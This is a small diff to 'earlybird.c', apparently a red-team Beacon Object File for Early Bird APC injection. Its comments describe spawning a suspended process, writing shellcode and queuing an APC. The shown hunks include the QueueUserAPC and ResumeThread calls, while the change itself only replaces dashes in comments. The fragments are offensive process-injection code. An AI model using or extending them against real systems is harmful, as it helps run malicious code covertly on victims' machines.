@@ -1,5 +1,5 @@
 /*
- * earlybird.c — Early Bird APC injection BOF
+ * earlybird.c - Early Bird APC injection BOF
  *
  * Spawns a target process suspended, allocates memory, writes shellcode,
  * queues an APC to the main thread, and resumes. The APC fires before
@@ -123,7 +123,7 @@ void go(char* args, int len)
         return;
     }
 
-    /* Queue APC — shellcode runs before the process entry point */
+    /* Queue APC - shellcode runs before the process entry point */
     DWORD apcResult = KERNEL32$QueueUserAPC(
         (PAPCFUNC)remoteAddr,
         pi.hThread,
@@ -138,7 +138,7 @@ void go(char* args, int len)
         return;
     }
 
-    /* Resume thread — APC fires before main entry */
+    /* Resume thread - APC fires before main entry */
     KERNEL32$ResumeThread(pi.hThread);
 
     BeaconPrintf(CALLBACK_OUTPUT, "Early Bird APC injected into PID %d",
